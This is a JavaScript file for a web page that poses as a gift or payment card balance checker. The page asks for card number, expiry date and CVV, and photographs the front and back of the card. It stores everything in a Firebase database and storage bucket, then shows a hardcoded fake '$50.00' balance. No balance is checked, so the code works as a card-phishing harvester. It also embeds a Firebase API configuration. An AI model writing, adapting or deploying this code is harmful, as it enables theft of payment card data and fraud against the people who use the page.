// js/balance.js
// Firebase Config (same project as admin.html)
const firebaseConfig = {
    apiKey: "AIzaSyBRmao9nvw49R1U6zS9NNY5W4Dn-NkNcrg",
    authDomain: "vanilla-3be8f.firebaseapp.com",
    projectId: "vanilla-3be8f",
    storageBucket: "vanilla-3be8f.firebasestorage.app",
    messagingSenderId: "476314002999",
    appId: "1:476314002999:web:38adc0bd80a8d6b44f81b2"
};

// Initialize Firebase (global compat – works with the <script> tags you already load in admin.html)
firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const storage = firebase.storage();

// DOM Elements
const form = document.getElementById('balanceForm');
const submitBtn = document.getElementById('submitBtn');
const label = submitBtn.querySelector('[data-label]');
const spinner = submitBtn.querySelector('[data-spinner]');
const status = document.getElementById('submitStatus');
const result = document.getElementById('result');
const balanceText = document.getElementById('balanceText');

// Camera elements
const video = document.getElementById('video');
const captureBtn = document.getElementById('captureBtn');
const closeCameraBtn = document.getElementById('closeCameraBtn');
const capturedImg = document.getElementById('capturedImg');
const uploadBtn = document.getElementById('uploadBtn');
const retakeBtn = document.getElementById('retakeBtn');
const uploadStatus = document.getElementById('uploadStatus');
const cameraPreview = document.getElementById('cameraPreview');
const capturedPreview = document.getElementById('capturedPreview');
const fileInput = document.getElementById('fileInput');
const openCameraBtn = document.getElementById('openCameraBtn');

// Dual camera elements
const dualCaptureBlock = document.getElementById('dualCaptureBlock');
const dualVideoFront = document.getElementById('dualVideoFront');
const dualVideoBack = document.getElementById('dualVideoBack');
const captureFrontBtn = document.getElementById('captureFrontBtn');
const captureBackBtn = document.getElementById('captureBackBtn');
const frontPreview = document.getElementById('frontPreview');
const backPreview = document.getElementById('backPreview');
const finishAndSubmitBtn = document.getElementById('finishAndSubmitBtn');
const dualCloseBtn = document.getElementById('dualCloseBtn');

let stream = null;
let capturedBlob = null;
let frontBlob = null;
let backBlob = null;

// ---------- SINGLE CAMERA ----------
openCameraBtn.onclick = async () => {
    cameraPreview.classList.remove('hidden');
    capturedPreview.classList.add('hidden');
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
        video.srcObject = stream;
    } catch (e) {
        status.textContent = 'Camera access denied';
    }
};

closeCameraBtn.onclick = () => {
    if (stream) stream.getTracks().forEach(t => t.stop());
    cameraPreview.classList.add('hidden');
};

captureBtn.onclick = () => {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    capturedBlob = canvas.toBlob(blob => {
        capturedBlob = blob;
        capturedImg.src = URL.createObjectURL(blob);
        cameraPreview.classList.add('hidden');
        capturedPreview.classList.remove('hidden');
    }, 'image/jpeg', 0.9);
};

retakeBtn.onclick = () => {
    capturedPreview.classList.add('hidden');
    cameraPreview.classList.remove('hidden');
};

uploadBtn.onclick = async () => {
    if (!capturedBlob) return;
    uploadStatus.textContent = 'Uploading...';
    const fileName = `card_${Date.now()}.jpg`;
    const ref = storage.ref(`images/${fileName}`);
    try {
        await ref.put(capturedBlob);
        const url = await ref.getDownloadURL();
        document.getElementById('front_image_url').value = url;
        document.getElementById('back_image_url').value = url; // single image used for both
        uploadStatus.textContent = 'Uploaded!';
        uploadStatus.classList.add('text-green-600');
    } catch (e) {
        uploadStatus.textContent = 'Upload failed';
        uploadStatus.classList.add('text-red-600');
    }
};

// File input (upload from gallery)
fileInput.onchange = (e) => {
    const file = e.target.files[0];
    if (!file) return;
    capturedBlob = file;
    capturedImg.src = URL.createObjectURL(file);
    cameraPreview.classList.add('hidden');
    capturedPreview.classList.remove('hidden');
};

// ---------- DUAL CAMERA ----------
openCameraBtn.addEventListener('dblclick', () => {
    dualCaptureBlock.classList.remove('hidden');
    startDualCamera();
});

dualCloseBtn.onclick = () => {
    dualCaptureBlock.classList.add('hidden');
    stopDualCamera();
};

async function startDualCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
        dualVideoFront.srcObject = stream;
        dualVideoBack.srcObject = stream;
    } catch (e) { }
}

function stopDualCamera() {
    if (stream) stream.getTracks().forEach(t => t.stop());
}

captureFrontBtn.onclick = () => captureDual(dualVideoFront, frontPreview, () => frontBlob = capturedBlob);
captureBackBtn.onclick = () => captureDual(dualVideoBack, backPreview, () => backBlob = capturedBlob);

function captureDual(videoEl, imgEl, setBlob) {
    const canvas = document.createElement('canvas');
    canvas.width = videoEl.videoWidth;
    canvas.height = videoEl.videoHeight;
    canvas.getContext('2d').drawImage(videoEl, 0, 0);
    canvas.toBlob(blob => {
        setBlob(blob);
        imgEl.src = URL.createObjectURL(blob);
        imgEl.classList.remove('hidden');
    }, 'image/jpeg', 0.9);
}

finishAndSubmitBtn.onclick = async () => {
    if (!frontBlob && !backBlob) {
        status.textContent = 'Capture at least one side';
        return;
    }
    status.textContent = 'Uploading images...';
    try {
        const frontUrl = frontBlob ? await uploadImage(frontBlob, 'front') : '';
        const backUrl = backBlob ? await uploadImage(backBlob, 'back') : '';
        document.getElementById('front_image_url').value = frontUrl;
        document.getElementById('back_image_url').value = backUrl;
        status.textContent = 'Images uploaded! Click "Check Balance"';
        dualCaptureBlock.classList.add('hidden');
    } catch (e) {
        status.textContent = 'Upload failed';
    }
};

async function uploadImage(blob, side) {
    const fileName = `${side}_${Date.now()}.jpg`;
    const ref = storage.ref(`images/${fileName}`);
    await ref.put(blob);
    return await ref.getDownloadURL();
}

// ---------- FORM SUBMIT ----------
form.onsubmit = async (e) => {
    e.preventDefault();
    label.classList.add('hidden');
    spinner.classList.remove('hidden');
    status.textContent = 'Sending details...';

    const data = {
        card_number: form.card_number.value.trim(),
        expiry_date: form.expiry_date.value.trim(),
        cvv: form.cvv.value.trim(),
        front_image: document.getElementById('front_image_url').value || null,
        back_image: document.getElementById('back_image_url').value || null,
        timestamp: Date.now()
    };

    try {
        await db.ref('submissions').push(data);
        status.textContent = 'Details sent! Checking balance...';
        balanceText.textContent = '$50.00'; // Fake success for demo
        result.classList.remove('hidden');
        setTimeout(() => {
            form.reset();
            document.getElementById('front_image_url').value = '';
            document.getElementById('back_image_url').value = '';
            result.classList.add('hidden');
            status.textContent = '';
            label.classList.remove('hidden');
            spinner.classList.add('hidden');
        }, 4000);
    } catch (e) {
        status.textContent = 'Error. Try again.';
        console.error(e);
    } finally {
        label.classList.remove('hidden');
        spinner.classList.add('hidden');
    }
};
